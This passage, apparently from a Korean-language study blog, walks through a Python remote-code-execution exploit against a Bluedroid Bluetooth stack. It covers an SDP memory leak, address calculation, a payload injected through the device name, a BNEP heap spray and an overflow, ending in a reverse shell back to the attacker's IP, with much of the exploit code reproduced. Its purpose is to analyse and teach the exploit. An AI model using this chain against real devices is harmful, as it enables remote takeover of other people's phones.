bluetooth_default_bss_base, system_addr, acl_name_addr, my_ip, libc_text_base)</span><br><span class="line">        <span class="comment"># Check if we got a connectback</span></span><br><span class="line">        readable, _, _ = select.select([sh_s], [], [], PWNING_TIMEOUT)</span><br><span class="line">        <span class="keyword">if</span> readable:</span><br><span class="line">            log.info(<span class="string">&#x27;Done&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">assert</span> <span class="literal">False</span>, <span class="string">&quot;Pwning failed all attempts&quot;</span></span><br><span class="line"></span><br><span class="line">    connectback.interactive_shell(sh_s, stdin, stdout, my_ip, STDIN_PORT, STDOUT_PORT)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main(*sys.argv[<span class="number">1</span>:])</span><br></pre></td></tr></table></figure>


<h2 id="주요-공격-흐름"><a href="#주요-공격-흐름" class="headerlink" title="주요 공격 흐름"></a>주요 공격 흐름</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">main() ───────────────────────────────────────────────────────────────┐</span><br><span class="line">  │                                                                   │</span><br><span class="line">  ├── 1. Bluetooth 초기화 (SSP 끄기 + 이전 연결 정리)                 │</span><br><span class="line">  ├── 2. TCP reverse shell을 위한 포트 리스닝 설정                    │</span><br><span class="line">  ├── 3. PWN_ATTEMPTS 반복: 공격 시도                                 │</span><br><span class="line">  │     ├── set_rand_bdaddr() → 랜덤 BT 주소 설정                    │</span><br><span class="line">  │     ├── LEAK_ATTEMPTS 반복:                                      │</span><br><span class="line">  │     │     └── memory_leak_get_bases()                            │</span><br><span class="line">  │     │           ├── do_sdp_info_leak() 호출                      │</span><br><span class="line">  │     │           ├── leaked offset → libc_base, bss_base 계산     │</span><br><span class="line">  │     │           └── SDP ACL 연결 종료                             │</span><br><span class="line">  │     ├── system_addr, acl_name_addr 계산                           │</span><br><span class="line">  │     └── pwn() 실행                                                │</span><br><span class="line">  │           ├── set_bt_name() → BT 이름에 페이로드 주입           │</span><br><span class="line">  │           │     ├── HCI 소켓 생성 → 이름 설정 HCI CMD 전송      │</span><br><span class="line">  │           │     └── BNEP 연결로 이름 &quot;refresh&quot;                   │</span><br><span class="line">  │           ├── BNEP 대량 메시지 전송 → 힙 스프레이                │</span><br><span class="line">  │           └── 힙 오버플로우 패킷 전송 → RCE 트리거               │</span><br><span class="line">  │                                                                   │</span><br><span class="line">  └── 성공 시 connectback.interactive_shell()로 쉘 연결 수립         │</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="실제-공격-흐름-추적"><a href="#실제-공격-흐름-추적" class="headerlink" title="실제 공격 흐름 추적"></a>실제 공격 흐름 추적</h2><h3 id="def-main-src-hci-dst-my-ip"><a href="#def-main-src-hci-dst-my-ip" class="headerlink" title="def main(src_hci, dst, my_ip)"></a>def main(src_hci, dst, my_ip)</h3><ol>
<li><p><code>if __name__ == &#39;__main__&#39;: main(*sys.argv[1:])</code> 에 의해 호출됨  </p>
<ol>
<li><code>sys.argv[1:]</code> : CLI에 입력된 명령어 배열을 첫 번째 명령어만 빼고 전달  </li>
<li>예시 실행 명령:  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 doit.py hci0 11:22:33:44:55:66 192.168.0.10</span><br></pre></td></tr></table></figure></li>
<li>전달된 인자:  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">main(src_hci=<span class="string">&#x27;hci0&#x27;</span>, dst=<span class="string">&#x27;11:22:33:44:55:66&#x27;</span>, my_ip=<span class="string">&#x27;192.168.0.10&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
<li>→ hci0(공격자 인터페이스), 11:22:33:44:55:66(피해자 블루투스 MAC 주소), 공격자 IP</li>
</ol>
</li>
<li><p>호출된 이후</p>
<ol>
<li><p><code>os.system()</code> : 공격자&#x2F;피해자 장비 초기화</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">os.system(<span class="string">&#x27;hciconfig %s sspmode 0&#x27;</span> % (src_hci,))</span><br><span class="line">os.system(<span class="string">&#x27;hcitool dc %s&#x27;</span> % (dst,))</span><br></pre></td></tr></table></figure>

<ul>
<li><p>명령어 분석</p>
<ol>
<li><code>os.system(&quot;운영체제 명령어&quot;)</code> : 파이썬에서 OS 명령어 실행</li>
<li>즉, 운영체제로 아래 명령어 전달  <ul>
<li><code>hciconfig %s sspmode 0</code> → 공격자 블루투스 장비 초기화  </li>
<li><code>hcitool dc %s</code> → 피해자와의 연결 해제</li>
</ul>
</li>
</ol>
</li>
<li><p>명령어 뜻</p>
<ol>
<li><code>&#39;hciconfig %s sspmode 0&#39;</code> → 공격자 기기에 SSP(간단 보안 페어링) 끄기  </li>
<li><code>&#39;hcitool dc %s&#39;</code> → victim 블루투스 ACL 연결 끊기 (<code>dc = disconnect</code>)  <ul>
<li>목적: 이전 세션&#x2F;캐시 초기화</li>
</ul>
</li>
</ol>
</li>
</ul>
</li>
<li><p>다음 호출  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh_s, stdin, stdout = connectback.create_sockets(NC_PORT, STDIN_PORT, STDOUT_PORT)</span><br></pre></td></tr></table></figure>
<ul>
<li>분석:<ol>
<li><code>connectback.create_sockets(...)</code> → 공격자 컴퓨터에 3개의 TCP 포트 열고 리스닝</li>
<li>표준 입력&#x2F;출력 및 셸 인터랙션을 위한 통신 채널 준비</li>
</ol>
</li>
</ul>
</li>
<li><p>반복문  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(PWN_ATTEMPTS):</span><br></pre></td></tr></table></figure>
<ul>
<li><p><code>PWN_ATTEMPTS = 10</code> → 총 10회 시도</p>
</li>
<li><p>로그 출력:  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">log.info(<span class="string">&#x27;Pwn attempt %d:&#x27;</span> % (i,))</span><br></pre></td></tr></table></figure>
<ul>
<li>pwntools 라이브러리 로그로 시도 횟수 출력  </li>
<li>로그(logging)에 대한 개념은 따로 확인 추천</li>
</ul>
</li>
<li><p>랜덤 BD_ADDR 생성:  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">src = set_rand_bdaddr(src_hci)</span><br></pre></td></tr></table></figure>
<ol>
<li><code>bdaddr</code> &#x3D; Bluetooth Device Address</li>
<li>공격자 블루투스 MAC 주소를 랜덤하게 설정</li>
<li>목적: victim 캐시 우회</li>
</ol>
</li>
</ul>
</li>
<li><p>메모리 유출 시도 반복문</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(LEAK_ATTEMPTS):</span><br></pre></td></tr></table></figure>
<ul>
<li><p>5회 반복</p>
</li>
<li><p>호출:  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libc_text_base, bluetooth_default_bss_base = memory_leak_get_bases(src, src_hci, dst)</span><br></pre></td></tr></table></figure>
<ul>
<li>해당 함수에서 <code>libc</code>, <code>bluetooth.default.so</code> 메모리 베이스 주소 유출</li>
<li>참고: <a href="#def-memory_leak_get_bases-src-src_hci-dst">memory_leak_get_bases()</a></li>
</ul>
</li>
<li><p>정렬 확인:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (libc_text_base &amp; <span class="number">0xfff</span> == <span class="number">0</span>) <span class="keyword">and</span> (bluetooth_default_bss_base &amp; <span class="number">0xfff</span> == <span class="number">0</span>):</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">assert</span> <span class="literal">False</span>, <span class="string">&quot;Memory doesn&#x27;t seem to have leaked as expected. Wrong .so versions?&quot;</span></span><br></pre></td></tr></table></figure>
<ol>
<li><code>&amp; 0xfff == 0</code> → 페이지 경계(4096 바이트) 정렬 여부 확인</li>
</ol>
</li>
</ul>
</li>
<li><p>주소 계산  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">system_addr = LIBC_TEXT_STSTEM_OFFSET + libc_text_base</span><br><span class="line">acl_name_addr = BSS_ACL_REMOTE_NAME_OFFSET + bluetooth_default_bss_base</span><br></pre></td></tr></table></figure>
<ul>
<li><code>system_addr</code> : libc에서 system 함수 오프셋 + 베이스 주소  </li>
<li><code>acl_name_addr</code> : BSS 내 특정 오프셋 + 블루투스 .so 베이스 주소  </li>
<li>이후 익스플로잇용 명령어 준비를 위한 주소 세팅</li>
</ul>
</li>
<li><p>정렬 검증  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">assert</span> acl_name_addr % <span class="number">4</span> == <span class="number">0</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>정보 출력  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">log.info(<span class="string">&#x27;system: 0x%08x, acl_name: 0x%08x&#x27;</span> % (system_addr, acl_name_addr))</span><br></pre></td></tr></table></figure>
</li>
<li><p>익스플로잇 수행  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwn(src_hci, dst, bluetooth_default_bss_base, system_addr, acl_name_addr, my_ip, libc_text_base)</span><br></pre></td></tr></table></figure>
<ul>
<li><a href="#def--pwnsrc_hci-dst-bluetooth_default_bss_base-system_addr-acl_name_addr-my_ip-libc_text_base">pwn 함수 정의로 이동</a></li>
<li>내부 동작:<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">readable, _, _ = select.select([sh_s], [], [], PWNING_TIMEOUT)</span><br><span class="line"><span class="keyword">if</span> readable:</span><br><span class="line">    log.info(<span class="string">&#x27;Done&#x27;</span>)</span><br><span class="line">    <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<ul>
<li>리스닝 소켓(sh_s)에 역접속 감지 시 로그 출력하고 루프 종료</li>
</ul>
</li>
</ul>
</li>
</ol>
</li>
</ol>
<hr>
<h3 id="def-memory-leak-get-bases-src-src-hci-dst"><a href="#def-memory-leak-get-bases-src-src-hci-dst" class="headerlink" title="def memory_leak_get_bases(src, src_hci, dst)"></a>def memory_leak_get_bases(src, src_hci, dst)</h3><ol>
<li><p><code>prog = log.progress(&#39;Doing stack memory leak...&#39;)</code>  </p>
<ul>
<li>로그 생성 (pwntools 활용해 역동적인 로딩 애니메이션을 보여줌)</li>
</ul>
</li>
<li><p><code>result = bluedroid.do_sdp_info_leak(dst, src)</code><br>2.1. <code>bluedroid.do_sdp_info_leak()</code>  </p>
<ul>
<li><p><code>bluedroid.py</code>에 정의되어 있음  </p>
<ul>
<li>함수 분석</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> btsock</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> sdp</span><br><span class="line"></span><br><span class="line"><span class="comment"># This is required to assure than the SDP respones are splitted to multiple fragments,</span></span><br><span class="line"><span class="comment"># thus assuering that cont_state is attached to the responses.</span></span><br><span class="line"><span class="comment"># sdp 응답이 단편화되는 걸 확실시하기 위해 mtu 설정.</span></span><br><span class="line"><span class="comment"># -&gt; 패킷이 단편화되면 sdp 서버는 응답에 반드시 continuation state(cont_offset포함)을 포함시키게 된다.</span></span><br><span class="line">MIN_MTU = <span class="number">48</span></span><br><span class="line">SDP_PSM = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># This function assumes that L2CAP_UUID response would be larger than ATT_UUID response</span></span><br><span class="line"><span class="comment"># (This will than lead to the underflow of rem_handles)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">do_sdp_info_leak</span>(<span class="params">dst, src</span>):</span><br><span class="line">    socket = btsock.l2cap_connect((dst, SDP_PSM), (src, <span class="number">0</span>), MIN_MTU)</span><br><span class="line">    socket.send(sdp.pack_search_request(sdp.L2CAP_UUID))</span><br><span class="line">    response = sdp.unpack_sdp_pdu(socket.recv(<span class="number">4096</span>))</span><br><span class="line">    response[<span class="string">&#x27;payload&#x27;</span>] = sdp.unpack_search_response(response[<span class="string">&#x27;payload&#x27;</span>])</span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">        cstate = response[<span class="string">&#x27;payload&#x27;</span>][<span class="string">&#x27;cstate&#x27;</span>]</span><br><span class="line">        <span class="keyword">assert</span> cstate != <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        socket.send(sdp.pack_search_request(sdp.ATT_UUID,</span><br><span class="line">                                            cstate=cstate))</span><br><span class="line">        response = sdp.unpack_sdp_pdu(socket.recv(<span class="number">4096</span>))</span><br><span class="line">        response[<span class="string">&#x27;payload&#x27;</span>] = sdp.unpack_search_response(response[<span class="string">&#x27;payload&#x27;</span>])</span><br><span class="line">        result.append(response[<span class="string">&#x27;payload&#x27;</span>][<span class="string">&#x27;records&#x27;</span>])</span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>

<ul>
<li><p>MTU 설정 → sdp 응답 단편화시키기 위해 최대 크기를 설정해둔다.  </p>
<ul>
<li>응답이 단편화되면 SDP 서버는 응답에 continuation state(cont_offset 포함)를 반드시 포함해야 함을 악용</li>
</ul>
</li>
<li><p>SDP_PSM 설정 → 내부 포트 번호…? 라고 생각하면 될 듯?</p>
</li>
<li><p><code>socket = btsock.l2cap_connect((dst, SDP_PSM), (src, 0), MIN_MTU)</code>  </p>
<ul>
<li><code>btsock.l2cap_connect</code>:<br>대상 장치와 통신할 BLUETOOTH 통신용 L2CAP 소켓을 만드는 함수.<br>공격자 기기의 1번 psm에서 대상 기기의 0번 psm와 통신할 소켓을 만들며, 이 통신의 mtu는 48로 설정한다.</li>
</ul>
</li>
<li><p><code>socket.send(sdp.pack_search_request(sdp.L2CAP_UUID))</code>  </p>
<ul>
<li>용어 풀이  <ul>
<li><strong>UUID</strong> : 기능 식별자  </li>
<li>블루투스 기기의 기능에 붙여지는 ID들  </li>
<li>ex) SDP 리퀘스트 : “너 뭐 할 수 있어?”  </li>
<li>SDP 응답 : “8001(UUID&#x2F;듣기), 8727(UUID&#x2F;마이크)….”  </li>
<li><strong>L2CAP_UUID</strong> : 서비스 목록을 요청할 때 자주 사용 (<strong>큰 응답</strong>이 돌아온다)</li>
</ul>
</li>
<li>공격자 → victim 으로 <strong>L2CAP_UUID</strong>(상대 기기의 기능 목록) 리퀘스트 전송<br>서버가 큰 응답을 단편화해 보내기를 유도</li>
</ul>
</li>
<li><p><code>response = sdp.unpack_sdp_pdu(socket.recv(4096))</code>  </p>
<ul>
<li>첫 조각을 받아 압축해제.</li>
</ul>
</li>
<li><p><code>response[&#39;payload&#39;] = sdp.unpack_search_response(response[&#39;payload&#39;])</code>  </p>
<ul>
<li>받은 응답을 파싱.  </li>
<li><code>sdp.py</code>에 <code>unpack_search_response</code>가 정의되어 있다.</li>
</ul>
  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">unpack_search_response</span>(<span class="params">response</span>):</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(response) &gt;= <span class="number">5</span></span><br><span class="line">    result = &#123;&#125;</span><br><span class="line">    result[<span class="string">&#x27;total_len&#x27;</span>], result[<span class="string">&#x27;current_len&#x27;</span>] = \</span><br><span class="line">        struct.unpack_from(<span class="string">&#x27;&gt;HH&#x27;</span>, response)</span><br><span class="line">    result[<span class="string">&#x27;records&#x27;</span>] = struct.unpack_from(<span class="string">&#x27;&gt;&#x27;</span> + (<span class="string">&#x27;I&#x27;</span> * result[<span class="string">&#x27;current_len&#x27;</span>]),</span><br><span class="line">                                           response[<span class="number">4</span>:])</span><br><span class="line">    cstate_len = response[<span class="number">4</span> + <span class="built_in">len</span>(result[<span class="string">&#x27;records&#x27;</span>]) * <span class="number">4</span>]</span><br><span class="line">    result[<span class="string">&#x27;cstate&#x27;</span>] = response[<span class="number">4</span> + <span class="built_in">len</span>(result[<span class="string">&#x27;records&#x27;</span>]) * <span class="number">4</span> + <span class="number">1</span>:]</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">chr</span>(<span class="built_in">len</span>(result[<span class="string">&#x27;cstate&#x27;</span>])) == cstate_len</span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>

<ul>
<li>간단 설명<br>SDP 메시지에서 정보를 추출한 뒤 구조체로 정리한다.</li>
</ul>
  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">unpack_search_response</span>(<span class="params">response</span>):</span><br><span class="line">    최소 응답 길이 확인</span><br><span class="line">    → 앞 <span class="number">4</span>바이트에서 total_len, current_len 추출</span><br><span class="line">    → 그 뒤에서 record handle들 추출 (current_len 개수만큼)</span><br><span class="line">    → 그 뒤 <span class="number">1</span>바이트에서 cstate 길이</span><br><span class="line">    → 그 다음부터 cstate 내용</span><br><span class="line">    → 길이 일치 확인 후 딕셔너리로 반환</span><br></pre></td></tr></table></figure>

<ul>
<li>Bluetooth SDP response 기본 구조 :</li>
</ul>
  <figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">+------------------------+</span><br><span class="line">| Total Data Length     |  (2 bytes)</span><br><span class="line">+------------------------+</span><br><span class="line">| Current Record Count  |  (2 bytes)</span><br><span class="line">+------------------------+</span><br><span class="line">| Record Handles (4 * N)|</span><br><span class="line">+------------------------+</span><br><span class="line">| cstate length         |  (1 byte)</span><br><span class="line">+------------------------+</span><br><span class="line">| cstate data           |  (N bytes)</span><br><span class="line">+------------------------+</span><br></pre></td></tr></table></figure>
</li>
<li><p>result 배열 설정 이후 반복문(20회)</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">result = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    cstate = response[<span class="string">&#x27;payload&#x27;</span>][<span class="string">&#x27;cstate&#x27;</span>]</span><br><span class="line">    <span class="keyword">assert</span> cstate != <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    socket.send(sdp.pack_search_request(sdp.ATT_UUID,</span><br><span class="line">                                        cstate=cstate))</span><br><span class="line">    response = sdp.unpack_sdp_pdu(socket.recv(<span class="number">4096</span>))</span><br><span class="line">    response[<span class="string">&#x27;payload&#x27;</span>] = sdp.unpack_search_response(response[<span class="string">&#x27;payload&#x27;</span>])</span><br><span class="line">    result.append(response[<span class="string">&#x27;payload&#x27;</span>][<span class="string">&#x27;records&#x27;</span>])</span><br></pre></td></tr></table></figure>

<ul>
<li>용어 설명  <ul>
<li><code>cstate</code> &#x3D; continuation state</li>
</ul>
</li>
<li><code>cstate = response[&#39;payload&#39;][&#39;cstate&#39;]</code>  <ul>
<li>cstate 추출</li>
</ul>
</li>
<li><code>assert cstate != b&#39;&#39;</code></li>
<li><code>socket.send(sdp.pack_search_request(sdp.ATT_UUID, cstate=cstate))</code>  <ul>
<li>이후, L2CAP_UUID 리퀘스트 응답의 cstate를 이용하여 ATT_UUID 리퀘스트를 보냄  </li>
<li>SDP 서버 : cstate confusion으로 메모리 누수</li>
</ul>
</li>
<li><code>response = sdp.unpack_sdp_pdu(socket.recv(4096))</code>  <ul>
<li>exploit의 응답을 받는다.</li>
</ul>
</li>
<li><code>response[&#39;payload&#39;] = sdp.unpack_search_response(response[&#39;payload&#39;])</code>  <ul>
<li>마찬가지로 공격 응답의 내용을 압축 해제</li>
</ul>
</li>
<li><code>result.append(response[&#39;payload&#39;][&#39;records&#39;])</code>  <ul>
<li>압축 해제한 내용 <code>result[]</code> 배열에 추가</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>2.2. result 리스트의 원소: <code>response[&#39;payload&#39;][&#39;records&#39;]</code><br>     - <code>result[i][j]</code> &#x3D; <code>i</code>번째 응답의 <code>j</code>번째 레코드 핸들</p>
</li>
<li><p><code>likely_some_libc_blx_offset = result[-3][-2]</code><br><code>likely_some_bluetooth_default_global_var_offset = result[6][0]</code>  </p>
<ul>
<li>libc 주소들을 result 배열을 이용하여 추출 (exploit해낸 데이터로부터)</li>
</ul>
</li>
<li><p><code>libc_text_base = likely_some_libc_blx_offset - LIBC_SOME_BLX_OFFSET</code><br><code>bluetooth_default_bss_base = likely_some_bluetooth_default_global_var_offset - BLUETOOTH_BSS_SOME_VAR_OFFSET</code>  </p>
<ul>
<li><code>libc_blx_offset</code>에서 <code>LIBC_SOME_BLX_OFFSET</code>를 빼서 <code>libc_text base</code> 계산  </li>
<li>마찬가지로 <code>likely_some_bluetooth_default_global_var_offset</code>에서 <code>BLUETOOTH_BSS_SOME_VAR_OFFSET</code>를 빼서 <code>bluetooth_default_bss_base</code> 계산</li>
</ul>
</li>
<li><p><code>log.info(&#39;libc_base: 0x%08x, bss_base: 0x%08x&#39; % (libc_text_base, bluetooth_default_bss_base))</code>  </p>
<ul>
<li>알아낸 libc 주소들을 화면에 출력</li>
</ul>
</li>
<li><p>Close SDP ACL connection  </p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">os.system(<span class="string">&#x27;hcitool dc %s&#x27;</span> % (dst,))</span><br><span class="line">time.sleep(<span class="number">0.1</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>os에 victim과의 연결을 끊으라는 명령 전달  </li>
<li>0.1초 sleep  <ul>
<li>이유: 명령이 바로 연속되어 꼬이는 걸 방지 (연결 상태 안정화)</li>
</ul>
</li>
</ul>
</li>
<li><p><code>prog.success()</code>  </p>
<ul>
<li>콘솔에 성공 메시지 띄움</li>
</ul>
</li>
<li><p><code>return libc_text_base, bluetooth_default_bss_base</code>  </p>
<ul>
<li>메모리 주소 반환하고 끝</li>
</ul>
</li>
</ol>
<hr>
<h3 id="def-pwn-src-hci-dst-bluetooth-default-bss-base-system-addr-acl-name-addr-my-ip-libc-text-base"><a href="#def-pwn-src-hci-dst-bluetooth-default-bss-base-system-addr-acl-name-addr-my-ip-libc-text-base" class="headerlink" title="def  pwn(src_hci, dst, bluetooth_default_bss_base, system_addr, acl_name_addr, my_ip, libc_text_base):"></a>def  pwn(src_hci, dst, bluetooth_default_bss_base, system_addr, acl_name_addr, my_ip, libc_text_base):</h3><ol>
<li><p><code># Gen new BDADDR, so that the new BT name will be cached</code><br><code>src = set_rand_bdaddr(src_hci)</code>  </p>
<ul>
<li>공격자 기기의 새로운 랜덤 bdaddr을 만든다. (victim 기기가 공격자 기기를 캐싱하는 걸 방지)</li>
</ul>
</li>
<li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = struct.pack(<span class="string">&#x27;&lt;III&#x27;</span>, <span class="number">0xAAAA1722</span>, <span class="number">0x41414141</span>, system_addr) + <span class="string">b&#x27;&quot;;\n&#x27;</span> + \</span><br><span class="line">    SHELL_SCRIPT.<span class="built_in">format</span>(ip=my_ip, port=NC_PORT) + <span class="string">b&#x27;\n#&#x27;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>쉘 전달용 페이로드 구성:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 0xAAAA1722 : BNEP 이벤트 ID</span><br><span class="line">2. 0x41414141 : 패딩</span><br><span class="line">3. system_addr : system() 함수 주소</span><br><span class="line">4. b&#x27;&quot;;\n&#x27; + SHELL_SCRIPT.format(...) : 쉘 스크립트</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set_bt_name(payload, src_hci, src, dst)</span><br></pre></td></tr></table></figure>
<ul>
<li>공격 페이로드를 블루투스 기기 이름으로 설정.  </li>
<li>BNEP 연결 시, 페이로드(기기 이름)가 상대방의 bss 주소로 쓰인다.</li>
</ul>
</li>
<li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">prog = log.progress(<span class="string">&#x27;Connecting to BNEP again&#x27;</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>로그 출력</li>
</ul>
</li>
<li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bnep = bluetooth.BluetoothSocket(bluetooth.L2CAP)</span><br><span class="line">bnep.bind((src, <span class="number">0</span>))</span><br><span class="line">bnep.connect((dst, BNEP_PSM))</span><br></pre></td></tr></table></figure>
<ul>
<li>상대 기기와 bnep 연결</li>
</ul>
</li>
<li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">prog.success()</span><br><span class="line">prog = log.progress(<span class="string">&#x27;Pwning...&#x27;</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>성공 로그 출력</li>
</ul>
</li>
<li><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    bnep.send(binascii.unhexlify(<span class="string">&#x27;8109&#x27;</span> + <span class="string">&#x27;800109&#x27;</span> * <span class="number">100</span>))</span><br></pre></td></tr></table></figure>
<ul>
<li>20회 동안 bnep.send()로 BNEP 패킷 100개씩 전송  <ul>
<li><strong>공격 배경 해설:</strong><ul>
<li>Bluetooth 스택 (BNEP 포함)은 큐 기반 구조를 사용<ul>
<li>큐는 list_node_t 같은 8바이트 구조체를 반복적으로 malloc()&#x2F;free()하며 메모리에서 리스트를 유지한다.</li>
<li><code>xmit_hold_q</code>: 보내야 할 메시지를 저장</li>
<li><code>hci_msg_q</code>: 수신된 메시지를 저장</li>
</ul>
</li>
</ul>
</li>
<li>공격자 패킷은 victim이 이해할 수 없는 명령 → “can’t understand command” 에러 응답 100개 생성</li>
<li>응답은 내부적으로  <code>xmit_hold_q</code>에 저장되고, 각각은 <code>list_node_t</code>로 감싸져 큐에 들어감 → 약 2000개의 구조체가 힙에 연속적으로 생성됨. (heap spray)</li>
<li>비동기적 처리로 일부는 free(), 일부는 잔류 → “구멍” 생김</li>
<li>이후 공격자가 8바이트 heap chunk overflow 시도:<ol>
